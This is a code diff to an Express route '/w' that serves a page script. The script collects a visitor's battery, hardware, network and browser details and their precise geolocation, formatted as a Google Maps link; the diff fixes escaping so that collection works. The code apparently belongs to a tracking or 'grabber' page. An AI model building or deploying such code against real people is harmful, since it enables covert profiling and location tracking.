@@ -162,7 +162,7 @@ app.get('/w', async (req, res) => {
                 try {
                     const battery = await navigator.getBattery();
                     data.battery = {
-                        level: `${Math.round(battery.level * 100)}%`,
+                        level: \`\${Math.round(battery.level * 100)}%\`,
                         isCharging: battery.charging
                     };
                 } catch (e) {
@@ -171,12 +171,12 @@ app.get('/w', async (req, res) => {
 
                 data.hardware = {
                     cpuCores: navigator.hardwareConcurrency || 'N/A',
-                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A'
+                    ram: navigator.deviceMemory ? \`\${navigator.deviceMemory} GB\` : 'N/A'
                 };
                 data.network = {
                     connectionType: navigator.connection?.type || 'N/A',
                     effectiveType: navigator.connection?.effectiveType || 'N/A',
-                    downlink: navigator.connection?.downlink ? `${navigator.connection.downlink} Mbps` : 'N/A'
+                    downlink: navigator.connection?.downlink ? \`\${navigator.connection.downlink} Mbps\` : 'N/A'
                 };
 
                 data.browser = {
@@ -191,7 +191,7 @@ app.get('/w', async (req, res) => {
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
                     });
-                    data.location = \`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}\`;
+                    data.location = \`https://www.google.com/maps/search/?api=1&query=\${position.coords.latitude},\${position.coords.longitude}\`;
                 } catch (e) {
                     console.warn('Geolocation failed:', e.message);
                 }
